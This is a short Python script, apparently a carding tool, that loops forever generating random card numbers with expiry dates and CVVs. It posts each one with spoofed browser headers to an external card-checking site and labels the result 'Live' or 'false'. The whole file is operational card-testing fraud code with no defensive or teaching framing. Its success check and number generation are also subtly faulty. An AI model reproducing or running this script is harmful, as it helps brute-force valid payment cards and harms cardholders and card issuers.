import requests
import random
numbers = '1234567890'
while True:
	v = str("".join(random.choice(numbers)for i in range(16)))
	c = str("".join(random.choice(numbers)for i in range(3)))
	month = ['01','02','03','04','05','06','07','08','09','10','11','12']
	m = random.choice(month)
	years = ['23','24','25','26','27','28','29']
	y = random.choice(years)
	visa = f'{v}|{m}|{y}|{c}'

	headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://checker.visatk.com',
    'Referer': 'https://checker.visatk.com/ccn1/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

	data = {
    'do': 'check',
    'cclist':visa,
}

	r = requests.post('https://checker.visatk.com/ccn1/alien07.php', headers=headers, data=data)
	if 'Live' in r :
		print(visa + ' Live')
	else:
		print(visa+ ' false')
